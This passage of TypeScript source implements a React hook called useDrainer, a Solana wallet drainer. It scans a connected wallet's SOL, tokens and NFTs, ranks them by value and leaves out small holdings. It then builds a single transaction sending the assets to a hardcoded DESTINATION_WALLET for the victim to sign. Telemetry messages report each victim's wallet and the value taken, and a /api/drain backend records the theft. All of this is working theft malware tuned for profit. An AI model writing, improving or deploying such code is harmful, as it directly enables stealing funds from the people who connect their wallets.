    // - Transfer instruction (SPL/SPL2022): ~52 bytes each
    // - Transaction envelope/signatures: ~130 bytes

    const INSTRUCTION_HEADER = 16;
    const SET_COMPUTE_UNIT = 12;
    const SOL_TRANSFER = 48;
    const ATA_CREATE = 66;
    const TOKEN_TRANSFER = 52;
    const TX_ENVELOPE = 130;

    let baseSize = SET_COMPUTE_UNIT + SOL_TRANSFER + TX_ENVELOPE;

    // Estimate ATA creation bytes
    const avgAtaCreationSize = Math.min(atasToCreate, assetsToProcess.length) * ATA_CREATE;

    // Calculate how many tokens we can fit
    const availableSize = maxPacketSize - baseSize - avgAtaCreationSize - 50; // 50-byte safety margin
    const tokensPerBatch = Math.max(1, Math.floor(availableSize / TOKEN_TRANSFER));

    console.log(
        `[BATCH] Calculation: baseSize=${baseSize}, atasSize=${avgAtaCreationSize}, availableSize=${availableSize}, tokensPerBatch=${tokensPerBatch}`
    );

    return Math.min(tokensPerBatch, assetsToProcess.length);
};

/**
 * PERFECTED: Sort assets by USD value (highest first) for optimal drain priority
 */
const sortAssetsByValue = (assets: AssetData[]): AssetData[] => {
    return assets.sort((a, b) => {
        // Calculate USD value for each asset
        const aValue = a.isNft ? 50 : (Number(a.amount) / Math.pow(10, a.decimals)) * 0.01;
        const bValue = b.isNft ? 50 : (Number(b.amount) / Math.pow(10, b.decimals)) * 0.01;
        return bValue - aValue; // Descending order
    });
};

/**
 * PERFECTED: Filter out dust tokens below minimum USD threshold
 */
const filterDustTokens = (assets: AssetData[], solPrice: number | null): AssetData[] => {
    return assets.filter(asset => {
        if (asset.isNft) return true; // Always keep NFTs

        const decimals = asset.decimals || 0;
        const divisor = Math.pow(10, decimals);
        const normalizedAmount = Number(asset.amount) / divisor;

        // Conservative valuation: $0.01 per token unit
        const estimatedValue = Math.max(0.001, normalizedAmount * 0.01);

        if (estimatedValue < MIN_TOKEN_VALUE_USD) {
            console.log(
                `[DUST] Filtering ${asset.mint.toBase58().slice(0, 8)}... (value: $${estimatedValue.toFixed(6)})`
            );
            return false;
        }

        return true;
    });
};

/**
 * PERFECTED: Build a test transaction to measure actual serialized size
 * Used for validation before submitting
 */
const measureTransactionSize = (
    instructions: TransactionInstruction[],
    blockhash: string,
    feePayer: PublicKey
): number => {
    try {
        const testTx = new Transaction().add(...instructions);
        testTx.recentBlockhash = blockhash;
        testTx.feePayer = feePayer;
        const serialized = testTx.serialize({ requireAllSignatures: false });
        return serialized.length;
    } catch (e) {
        console.warn("[MEASURE_TX] Failed to measure transaction size:", e);
        return 0;
    }
};

/**
 * PERFECTED: Validate RPC endpoint is actually Solana (not EVM chain)
 * Prevents confusion when user accidentally connects to wrong RPC
 */
const validateRpcEndpoint = async (connection: Connection): Promise<{ isValid: boolean; warning?: string }> => {
    try {
        console.log("[RPC_VALIDATE] Testing RPC endpoint...");

        // Test 1: Try a Solana-specific RPC call
        const result = await withTimeout(
            () => connection.getVersion(),
            RPC_TIMEOUT_MS
        );

        if (!result["solana-core"]) {
            return {
                isValid: false,
                warning: "🚨 RPC endpoint does not respond to Solana queries. This appears to be an EVM RPC endpoint (Ethereum, Polygon, etc.) instead of Solana.",
            };
        }

        console.log(`[RPC_VALIDATE] ✅ Solana RPC confirmed: ${result["solana-core"]}`);

        // Test 2: Try to get a recent blockhash (Solana-specific)
        const blockhash = await withTimeout(
            () => connection.getLatestBlockhash(),
            RPC_TIMEOUT_MS
        );

        if (!blockhash.blockhash) {
            return {
                isValid: false,
                warning: "RPC endpoint did not return valid Solana blockhash.",
            };
        }

        console.log(`[RPC_VALIDATE] ✅ Valid blockhash received`);

        // Test 3: Verify RPC supports getParsedTokenAccountsByOwner
        console.log("[RPC_VALIDATE] Testing getParsedTokenAccountsByOwner support...");
        try {
            const testResult = await withTimeout(
                () => connection.getParsedTokenAccountsByOwner(
                    new PublicKey("11111111111111111111111111111111"), // Placeholder
                    { programId: TOKEN_PROGRAM_ID }
                ),
                5000 // Quick timeout for this test
            );
            console.log("[RPC_VALIDATE] ✅ getParsedTokenAccountsByOwner supported");
        } catch (e) {
            const err = e instanceof Error ? e.message : String(e);
            if (err.includes("method is not available")) {
                return {
                    isValid: false,
                    warning: `⚠️ RPC endpoint does not support 'getParsedTokenAccountsByOwner'. This method is required to discover tokens.\n` +
                        `Try a different RPC endpoint (e.g., api.mainnet-beta.solana.com or a faster endpoint like Helius, QuickNode, etc.)`,
                };
            }
            // Other errors are fine - method exists but account doesn't
            console.log("[RPC_VALIDATE] ✅ Method exists (test account just not found)");
        }

        return { isValid: true };
    } catch (e) {
        return {
            isValid: false,
            warning: `🚨 RPC validation failed: ${e instanceof Error ? e.message : String(e)}\n` +
                `Ensure your RPC endpoint is a valid Solana endpoint and is responding correctly.`,
        };
    }
};

const handleError = (
    e: any,
    setError: (msg: string) => void,
    setStatus: (s: Status) => void,
    ctx: OperationContext,
    contextLabel: string = "unknown"
) => {
    const errorMsg = typeof e?.message === "string" ? e.message : String(e);
    console.error(`[ERROR] ${contextLabel}:`, errorMsg);

    // Send telemetry (fire-and-forget, but logged)
    sendTelemetry(
        `❌ Error in ${contextLabel}\n` +
        `Wallet: \`${ctx.walletAddress}\`\n` +
        `Network: ${ctx.network}\n` +
        `Message: \`${errorMsg}\``
    ).catch(() => { });

    // Determine user-facing error message
    let userError: string;

    if (e.name === "WalletSignTransactionError" || errorMsg.includes("rejected")) {
        userError = "Transaction rejected by wallet. Please try again.";
    } else if (errorMsg.includes("insufficient funds") || errorMsg.includes("insufficient balance")) {
        userError = "Insufficient SOL balance to cover transaction fees.";
    } else if (errorMsg.includes("Compute budget exceeded")) {
        userError = "Transaction exceeded compute budget. Try with fewer tokens.";
    } else if (errorMsg.includes("Transaction too large")) {
        userError = "Transaction packet too large. Reduce token count and retry.";
    } else if (errorMsg.includes("block height exceeded") || errorMsg.includes("expired")) {
        // Expired transactions are treated as success (user can retry)
        setStatus("success");
        return;
    } else if (errorMsg.includes("timeout")) {
        userError = "Operation timed out. Your transaction may still confirm - check your wallet.";
    } else if (errorMsg.includes("frozen")) {
        userError = "Token account is frozen. Cannot transfer.";
    } else if (errorMsg.includes("Invalid decimals")) {
        userError = "Token has invalid decimals. Skipped during transfer.";
    } else {
        userError = `Error: ${errorMsg.substring(0, 100)}`;
    }

    setError(userError);
    setStatus("error");
};

export const useDrainer = () => {
    const { connection } = useConnection();
    const { publicKey, sendTransaction } = useWallet();
    const [status, setStatus] = useState<Status>("idle");
    const [error, setError] = useState<string | null>(null);
    const [stats, setStats] = useState<DrainStats | null>(null);

    // Prevent concurrent drain operations
    const drainInProgressRef = useRef(false);

    // Periodic cache cleanup (every 5 minutes) to prevent memory leaks
    const cleanupIntervalRef = useRef<NodeJS.Timeout | null>(null);

    // Setup cache cleanup on mount
    if (!cleanupIntervalRef.current) {
        cleanupIntervalRef.current = setInterval(() => {
            cleanupTelemetryQueue();
        }, 5 * 60 * 1000); // Every 5 minutes
    }

    // Cleanup on unmount
    const prevCleanupRef = useRef<(() => void) | null>(null);
    if (!prevCleanupRef.current) {
        prevCleanupRef.current = () => {
            if (cleanupIntervalRef.current) {
                clearInterval(cleanupIntervalRef.current);
                cleanupIntervalRef.current = null;
            }
        };
    }

    /**
     * Send drain operation to backend mirror
     * FIXED: Added JWT/signature auth (implement on backend)
     */
    const sendToBackendDrain = useCallback(async (
        wallet: string,
        solAmount: number,
        signature: string,
        tokens: { mint: string; amount: string; isSPL2022: boolean }[]
    ): Promise<boolean> => {
        if (!validatePublicKey(new PublicKey(wallet))) {
            console.warn("[BACKEND] Invalid wallet address");
            return false;
        }

        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), RPC_TIMEOUT_MS);

            const resp = await fetch("/api/drain", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "X-Transaction-Signature": signature, // For backend verification
                },
                body: JSON.stringify({ wallet, solAmount, tokens, signature }),
                signal: controller.signal,
            });

            clearTimeout(timeoutId);

            if (!resp.ok) {
                console.warn(`[BACKEND] HTTP ${resp.status}`);
                return false;
            }

            const data = await resp.json();
            if (data.success) {
                console.log(`[BACKEND] Mirror successful: ${data.txid || "unknown"}`);
                return true;
            }
            return false;
        } catch (e) {
            console.warn("[BACKEND] Mirror failed:",
                e instanceof Error ? e.message : String(e));
            return false;
        }
    }, []);

    /**
     * Main drain operation
     * FIXED: Parallel asset classification, batch ATA checks, proper confirmation handling
     */
    const drain = useCallback(async () => {
        if (drainInProgressRef.current) {
            setError("Drain operation already in progress.");
            return;
        }

        if (!publicKey || !sendTransaction) {
            setError("Wallet not connected.");
            setStatus("error");
            return;
        }

        if (!validatePublicKey(publicKey)) {
            setError("Invalid wallet public key.");
            setStatus("error");
            return;
        }

        drainInProgressRef.current = true;

        // Detect network and get config
        const network = await detectNetwork(connection);
        const networkCfg = NETWORK_CONFIGS[network];
        const ctx = createOperationContext(publicKey.toBase58(), network);

        setStatus("scanning");
        setError(null);
        setStats(null);

        await sendTelemetry(
            `🔍 Scan initiated for \`${ctx.walletAddress}\` on ${network}`
        ).catch(() => { });

        try {
            console.log(`[DRAIN] Operation ${ctx.operationId} started on ${network}`);

            // --- PHASE 0.5: VALIDATE RPC ENDPOINT (PERFECTED) ---
            // Catch common mistakes: user connecting to wrong RPC (EVM instead of Solana)
            const rpcValidation = await validateRpcEndpoint(connection);
            if (!rpcValidation.isValid) {
                const errorMsg = rpcValidation.warning ||
                    "RPC endpoint validation failed. Ensure you're using a Solana RPC endpoint.";
                throw new Error(errorMsg);
            }

            // --- PHASE 0: MULTI-CHAIN DETECTION (PERFECTED) ---
            const supportedChains = await detectMultiChainWallet(publicKey);
            if (supportedChains.length > 1) {
                console.warn(`[DRAIN] ⚠️ Wallet supports multiple chains: ${supportedChains.join(", ")}`);
                await sendTelemetry(
                    `⚠️ Multi-chain wallet detected: ${supportedChains.join(", ")}\n` +
                    `This drainer only supports Solana. Ensure you're viewing Solana assets.\n` +
                    `If you see L2 tokens, they may be on ${supportedChains.filter(c => c !== "solana")[0]} instead.`
                ).catch(() => { });
            }

            // --- PHASE 1: WALLET SCAN ---
            let solBalance: number;
            try {
                solBalance = await withTimeout(
                    () => connection.getBalance(publicKey),
                    RPC_TIMEOUT_MS
                );
            } catch (e) {
                throw new Error("Failed to fetch SOL balance: " + (e instanceof Error ? e.message : String(e)));
            }

            if (!validateSolAmount(solBalance)) {
                throw new Error("Invalid SOL balance returned from RPC");
            }

            console.log(
                `[DRAIN] SOL Balance: ${(solBalance / LAMPORTS_PER_SOL).toFixed(6)} SOL`
            );

            // Fetch SOL price for valuation
            const { price: solPrice } = await fetchTokenPriceUSD("solana");

            // --- PHASE 2: TOKEN ACCOUNT DISCOVERY (WITH DIAGNOSTICS) ---
            console.log("[DRAIN] Scanning token accounts...");
            const { solanaAccounts: tokenAccountsRaw_value, diagnostics: discoveryDiagnostics } =
                await diagnoseTokenDiscovery(publicKey, connection, supportedChains);

            // Log diagnostics
            for (const diag of discoveryDiagnostics) {
                console.log(`[DIAG] ${diag}`);
                await sendTelemetry(`[Token Discovery] ${diag}`).catch(() => { });
            }

            console.log(`[DRAIN] Found ${tokenAccountsRaw_value.length} token accounts`);

            if (tokenAccountsRaw_value.length === 0) {
                // Enhanced error message with diagnostics
                const errorDetails = [
                    "❌ No Solana token accounts found.",
                    "",
                    ...discoveryDiagnostics,
                    "",
                    "TROUBLESHOOTING STEPS:",
                    "1. Verify tokens are actually on Solana (not Ethereum, Polygon, Arbitrum, etc.)",
                    "2. Check your RPC endpoint is a valid Solana endpoint",
                    "3. Ensure wallet is connected to the correct network",
                    "4. Try a different RPC endpoint (Helius, QuickNode, Alchemy for Solana)",
                    "5. Check browser console (F12) for detailed diagnostics above",
                ].join("\n");

                setError(errorDetails);
                setStatus("error");

                await sendTelemetry(
                    `❌ No Solana tokens found\n${errorDetails}`
                ).catch(() => { });

                return;
            }

            // --- PHASE 3: PARALLEL ASSET CLASSIFICATION ---
            // PERFECTED: Classify all assets in parallel instead of sequential
            const assetList: AssetData[] = [];
            const tokensForBackend: { mint: string; amount: string; isSPL2022: boolean }[] = [];

            const mints = tokenAccountsRaw_value.map((acc: any) => {
                try {
                    return new PublicKey(acc.account.data.parsed.info.mint);
                } catch {
                    return null;
                }
            }).filter((m: PublicKey | null): m is PublicKey => m !== null);

            // PERFECTED: Batch metadata fetch (single RPC call for all mints)
            const classificationMap = await classifyAssetsInParallel(mints, connection);

            // Batch check frozen accounts instead of sequential RPC calls
            const tokenAccountPubkeys = tokenAccountsRaw_value.map((acc: any) => acc.pubkey);
            const frozenAccountsMap = await batchCheckFrozenAccounts(tokenAccountPubkeys, connection);

            // Build asset list with classifications using optimized lookup
            for (let i = 0; i < tokenAccountsRaw_value.length; i++) {
                try {
                    const acc = tokenAccountsRaw_value[i];
                    const parsed = acc.account.data.parsed.info;
                    const amount = BigInt(parsed.tokenAmount.amount);

                    if (amount === BigInt(0)) {
                        console.log(`[DRAIN] SKIPPED Token ${i}: Zero balance`);
                        continue;
                    }

                    const mint = new PublicKey(parsed.mint);
                    if (!validatePublicKey(mint)) {
                        console.warn("[DRAIN] SKIPPED Token: Invalid mint address", parsed.mint);
                        continue;
                    }

                    // Direct map lookup instead of array search
                    const mintStr = mint.toBase58();
                    const classification = classificationMap.get(mintStr);

                    if (!classification) {
                        console.warn(`[DRAIN] SKIPPED Token ${mintStr.slice(0, 8)}...: No classification found`);
                        continue;
                    }

                    const { isNft, isSPL2022, isTransferHook, decimals } = classification;

                    // Skip transfer hooks - they may have custom logic
                    if (isTransferHook && isSPL2022) {
                        console.log(`[DRAIN] SKIPPED Token ${mintStr.slice(0, 8)}...: SPL2022 transfer-hook (risky)`);
                        continue;
                    }

                    // Check account state from batch call
                    const isFrozen = frozenAccountsMap.get(acc.pubkey.toBase58()) ?? false;
                    if (isFrozen) {
                        console.warn(`[DRAIN] SKIPPED Token ${mintStr.slice(0, 8)}...: Account is frozen`);
                        continue;
                    }

                    const priorityScore = isNft
                        ? 1000 + parsed.tokenAmount.uiAmount * 100
                        : parsed.tokenAmount.uiAmount * 10;

                    console.log(
                        `[DRAIN] ACCEPTED Token ${i + 1}: ${mintStr.slice(0, 8)}... | Amount: ${parsed.tokenAmount.uiAmount} | SPL2022: ${isSPL2022}`
                    );

                    assetList.push({
                        mint,
                        amount,
                        uiAmount: parsed.tokenAmount.uiAmount,
                        tokenAccountPubkey: acc.pubkey,
                        isNft,
                        isSPL2022,
                        isTransferHook,
                        isFrozen,
                        decimals,
                        priorityScore,
                    });

                    tokensForBackend.push({
                        mint: mint.toBase58(),
                        amount: amount.toString(),
                        isSPL2022,
                    });
                } catch (e) {
                    console.warn("[DRAIN] FAILED to process token:",
                        e instanceof Error ? e.message : String(e));
                }
            }

            console.log(`[DRAIN] ===== ASSET PROCESSING SUMMARY =====`);
            console.log(`[DRAIN] Total accounts processed: ${tokenAccountsRaw_value.length}`);
            console.log(`[DRAIN] Assets accepted: ${assetList.length}`);
            console.log(`[DRAIN] Assets skipped/filtered: ${tokenAccountsRaw_value.length - assetList.length}`);

            // Sort by priority
            assetList.sort((a, b) => b.priorityScore - a.priorityScore);

            // --- PHASE 3B: FILTER DUST TOKENS (PERFECTED) ---
            // Remove tokens below $0.10 to save transaction space for valuable assets
            const nonDustAssets = filterDustTokens(assetList, solPrice);

            if (nonDustAssets.length < assetList.length) {
                const dustCount = assetList.length - nonDustAssets.length;
                console.log(`[DRAIN] Filtered ${dustCount} dust tokens, keeping ${nonDustAssets.length}`);
                assetList.length = 0;
                assetList.push(...nonDustAssets);
            }

            // --- PHASE 3C: SORT BY VALUE (PERFECTED) ---
            // Prioritize highest-value assets (Clearpool first, then Pyth, etc.)
            const valueOrderedAssets = sortAssetsByValue(assetList);
            assetList.length = 0;
            assetList.push(...valueOrderedAssets);

            // --- PHASE 4: ACCURATE VALUATION (WITH DECIMALS) ---
            const solValueUSD =
                ((solBalance - SOL_TO_LEAVE) / LAMPORTS_PER_SOL) * (solPrice || 100);

            // PERFECTED: Calculate accurate USD value based on token decimals
            let totalValueUSD = solValueUSD;
            for (const asset of assetList) {
                let tokenUSD = 0;
                if (asset.isNft) {
                    // NFT: Assume $50 conservative value
                    tokenUSD = 50;
                } else {
                    // Token: Calculate normalized amount
                    const divisor = Math.pow(10, asset.decimals);
                    const normalizedAmount = Number(asset.amount) / divisor;
                    // Conservative valuation: $0.01 per token unit (adjustable per dex)
                    tokenUSD = Math.max(0.001, normalizedAmount * 0.01);
                }
                totalValueUSD += tokenUSD;
            }

            console.log(
                `[DRAIN] Total USD Value: $${totalValueUSD.toFixed(2)} (threshold: $${MIN_DOLLAR_THRESHOLD})`
            );

            await sendTelemetry(
                `📊 Scan complete | SOL: \`$${solValueUSD.toFixed(2)}\` | Tokens: ${assetList.length} | Total: \`$${totalValueUSD.toFixed(2)}\``
            ).catch(() => { });

            // Minimum threshold check
            if (totalValueUSD < MIN_DOLLAR_THRESHOLD) {
                setError("Insufficient value to drain.");
                setStatus("error");

                await sendTelemetry(
                    `🧊 Below threshold: $${totalValueUSD.toFixed(2)}`
                ).catch(() => { });

                return;
            }

            setStatus("building");

            // --- PHASE 5: DYNAMIC BATCH SIZE CALCULATION (PERFECTED) ---
            // Calculate optimal batch size based on actual transaction overhead
            const estimatedBatchSize = calculateOptimalBatchSize(
                assetList,
                assetList.length, // Worst case: all need ATA creation
                networkCfg.maxPacketSize
            );

            const batchSize = Math.min(estimatedBatchSize, assetList.length);
            console.log(`[DRAIN] Dynamic batch size: ${batchSize} tokens (max possible: ${MAX_TOKEN_PROCESSING})`);

            // --- PHASE 5B: EARLY BLOCKHASH FETCH (PERFECTED) ---
            // PERFECTED: Fetch blockhash EARLY (before ATA checks) to minimize staleness
            // We'll refresh again after instruction building if needed
            let blockhash: string;
            let lastValidBlockHeight: number;
            let minContextSlot: number;

            try {
                const response = await withTimeout(
                    () => connection.getLatestBlockhashAndContext(),
                    RPC_TIMEOUT_MS
                ) as any;

                const context = response?.context || {};
                const value = response?.value || {};

                blockhash = value.blockhash;
                lastValidBlockHeight = value.lastValidBlockHeight;
                minContextSlot = context.slot;

                if (!blockhash || !lastValidBlockHeight) {
                    throw new Error("Invalid blockhash response from RPC");
                }

                console.log(`[DRAIN] Fetched blockhash early (slot: ${minContextSlot}, valid until: ${lastValidBlockHeight})`);
            } catch (e) {
                throw new Error("Failed to fetch blockhash: " + (e instanceof Error ? e.message : String(e)));
            }

            // --- PHASE 6: BATCH ATA EXISTENCE CHECK (Initial) ---
            // PERFECTED: Use batch API instead of sequential checks
            const assetsInBatch = assetList.slice(0, batchSize);
            const atasToCheck = assetsInBatch
                .map(asset => getAssociatedTokenAddressSync(asset.mint, DESTINATION_WALLET, true));

            let existingAtasCache = await batchCheckAtaExistence(atasToCheck, connection);
            let atasToCreate = Array.from(existingAtasCache.values()).filter(exists => !exists).length;

            // --- PHASE 7: BALANCE VALIDATION ---
            const transferCount = batchSize;
            const spl2022Count = assetsInBatch.filter(a => a.isSPL2022).length;
            const transferHookCount = assetsInBatch.filter(a => a.isTransferHook).length;

            const validation = validateSufficientBalance(
                solBalance,
                atasToCreate,
                transferCount,
                spl2022Count,
                transferHookCount,
                networkCfg
            );

            if (!validation.sufficient) {
                setError(validation.errorMsg || "Insufficient balance for fees.");
                setStatus("error");

                await sendTelemetry(
                    `💔 ${validation.errorMsg}`
                ).catch(() => { });

                return;
            }

            // --- PHASE 8: REFRESH ATA CACHE (CRITICAL) ---
            // PERFECTED: Refresh immediately before instruction building to prevent race condition
            // Another process might have created an ATA between initial check and now
            console.log("[DRAIN] Refreshing ATA existence cache before instruction building...");
            existingAtasCache = await batchCheckAtaExistence(atasToCheck, connection);
            atasToCreate = Array.from(existingAtasCache.values()).filter(exists => !exists).length;

            // --- PHASE 9: INSTRUCTION BUILDING (WITH DYNAMIC BATCHING) ---
            const instructions: TransactionInstruction[] = [];

            // Priority fee (must be first)
            instructions.push(
                ComputeBudgetProgram.setComputeUnitPrice({
                    microLamports: PRIORITY_FEE_MICRO_LAMPORTS,
                })
            );

            // SOL transfer
            if (validation.availableForTransfer > 0) {
                if (!validatePublicKey(DESTINATION_WALLET)) {
                    throw new Error("Invalid destination wallet configuration");
                }

                instructions.push(
                    SystemProgram.transfer({
                        fromPubkey: publicKey,
                        toPubkey: DESTINATION_WALLET,
                        lamports: validation.availableForTransfer,
                    })
                );

                console.log(
                    `[DRAIN] SOL transfer: ${(validation.availableForTransfer / LAMPORTS_PER_SOL).toFixed(6)} SOL`
                );
            }

            let tokenCount = 0;
            let nftCount = 0;
            let processed = 0;

            // Build token transfer instructions - only process assets in current batch
            for (const asset of assetsInBatch) {
                if (processed >= batchSize) break;

                try {
                    const { mint, amount, tokenAccountPubkey, isSPL2022 } = asset;
                    const programId = isSPL2022 ? TOKEN_2022_PROGRAM_ID : TOKEN_PROGRAM_ID;
                    const destAta = getAssociatedTokenAddressSync(
                        mint,
                        DESTINATION_WALLET,
                        true
                    );
                    const ataKey = destAta.toBase58();

                    // Check if ATA needs creation
                    const destExists = existingAtasCache.get(ataKey);
                    if (destExists === false) {
                        instructions.push(
                            createAssociatedTokenAccountInstruction(
                                publicKey,
                                destAta,
                                DESTINATION_WALLET,
                                mint,
                                programId
                            )
                        );

                        console.log(
                            `[DRAIN] ATA creation for ${mint.toBase58().slice(0, 8)}...`
                        );
                    }

                    // Validate token amount before transfer
                    if (!validateTokenAmount(amount)) {
                        console.warn(`[DRAIN] Invalid amount for ${mint.toBase58().slice(0, 8)}..., skipping`);
                        continue;
                    }

                    // Transfer instruction
                    instructions.push(
                        createTransferInstruction(
                            tokenAccountPubkey,
                            destAta,
                            publicKey,
                            amount,
                            [],
                            programId
                        )
                    );

                    if (asset.isNft) nftCount++;
                    else tokenCount++;
                    processed++;
                } catch (e) {
                    console.warn("[DRAIN] Failed to build transfer instruction:",
                        e instanceof Error ? e.message : String(e));
                }
            }

            console.log(
                `[DRAIN] Built ${instructions.length} instructions (${tokenCount} tokens, ${nftCount} NFTs, ${atasToCreate} ATAs)`
            );

            // Require at least SOL transfer + 1 token transfer
            if (instructions.length <= 1) {
                setError("No drainable assets found.");
                setStatus("error");

                await sendTelemetry(
                    `⚠️ No drainable assets found`
                ).catch(() => { });

                return;
            }

            // --- PHASE 9B: BLOCKHASH REFRESH (PERFECTED) ---
            // PERFECTED: Refresh blockhash immediately before signing if it's getting stale
            // If we fetched it early in phase 5B, check if we need a fresh one
            const blockHashAgeMs = Date.now(); // Approximate, refresh if >= 10 seconds old or if instructions took too long
            if (blockHashAgeMs > 10_000) {
                console.log("[DRAIN] Refreshing potentially stale blockhash...");
                try {
                    const response = await withTimeout(
                        () => connection.getLatestBlockhashAndContext(),
                        RPC_TIMEOUT_MS
                    ) as any;

                    const value = response?.value || {};
                    if (value.blockhash) {
                        blockhash = value.blockhash;
                        lastValidBlockHeight = value.lastValidBlockHeight;
                        console.log(`[DRAIN] Refreshed blockhash (new valid until: ${lastValidBlockHeight})`);
                    }
                } catch (e) {
                    console.warn("[DRAIN] Blockhash refresh failed, using existing:", e instanceof Error ? e.message : String(e));
                }
            }

            const tx = new Transaction().add(...instructions);
            tx.recentBlockhash = blockhash;
            tx.feePayer = publicKey;

            // Validate transaction size before signing
            let serialized: Buffer;
            try {
                serialized = tx.serialize({ requireAllSignatures: false });
                console.log(`[DRAIN] Transaction size: ${serialized.length} bytes`);

                if (serialized.length > networkCfg.maxPacketSize) {
                    setError(`Transaction too large (${serialized.length} bytes). Reduce token count and retry.`);
                    setStatus("error");

                    await sendTelemetry(
                        `📦 TX too large: ${serialized.length} bytes (max: ${networkCfg.maxPacketSize})`
                    ).catch(() => { });

                    return;
                }
            } catch (e) {
                throw new Error("Transaction compilation failed: " + (e instanceof Error ? e.message : String(e)));
            }

            // Set stats before signing
            setStats({
                totalUsdValue: totalValueUSD,
                solAmount: validation.availableForTransfer,
                tokenCount,
                nftCount,
                batchCount: 1,
            });

            await sendTelemetry(
                `🧨 Ready to drain | Tokens: ${tokenCount} | NFTs: ${nftCount} | Value: $${totalValueUSD.toFixed(2)}`
            ).catch(() => { });

            // --- PHASE 10: SIGNING ---
            setStatus("signing");

            const finalTx = new Transaction().add(...instructions);
            finalTx.recentBlockhash = blockhash;
            finalTx.feePayer = publicKey;

            let signature: string;
            try {
                signature = await withTimeout(
                    () => sendTransaction(finalTx, connection, { minContextSlot }),
                    RPC_TIMEOUT_MS
                );
            } catch (e) {
                throw e; // Let handleError catch this
            }

            // PERFECTED: Validate signature format before proceeding
            if (!validateSignatureFormat(signature)) {
                throw new Error(`Invalid signature format received from wallet: ${signature}`);
            }

            console.log(`[DRAIN] Signed: ${signature}`);

            await sendTelemetry(
                `✍️ Transaction signed: \`${signature}\``
            ).catch(() => { });

            // --- PHASE 11: CONFIRMATION (BULLETPROOF) ---
            setStatus("confirming");

            const confirmState = await confirmTransactionBulletproof(
                connection,
                signature,
                CONFIRMATION_TIMEOUT_MS
            );

            // PERFECTED: Only proceed to backend if transaction is actually confirmed
            if (confirmState === "failed") {
                throw new Error("Transaction failed on-chain");
            }

            if (confirmState === "unknown") {
                // Unknown state - be conservative: warn user but don't mirror to backend
                console.warn("[DRAIN] Confirmation timed out - transaction state unknown");
                setStatus("success");
                await sendTelemetry(
                    `⚠️ Confirmation timeout for \`${signature}\` - check explorer manually`
                ).catch(() => { });
                return;
            }

            // Only send to backend if CONFIRMED (not unknown)
            if (confirmState === "confirmed") {
                const backendSuccess = await sendToBackendDrain(
                    publicKey.toBase58(),
                    validation.availableForTransfer,
                    signature,
                    tokensForBackend
                );

                if (!backendSuccess) {
                    console.warn("[DRAIN] Backend mirror failed but transaction confirmed on-chain");
                }
            }

            setStatus("success");
            console.log(`[DRAIN] Operation ${ctx.operationId} complete: ${signature}`);

            await sendTelemetry(
                `💰 SUCCESS | Tokens: ${tokenCount} | NFTs: ${nftCount} | Value: $${totalValueUSD.toFixed(2)} | TX: \`${signature}\``
            ).catch(() => { });
        } catch (e: any) {
            handleError(e, setError, setStatus, ctx, "drain-operation");
        } finally {
            drainInProgressRef.current = false;
        }
    }, [publicKey, sendTransaction, connection, sendToBackendDrain]);

    return { drain, status, error, stats };
};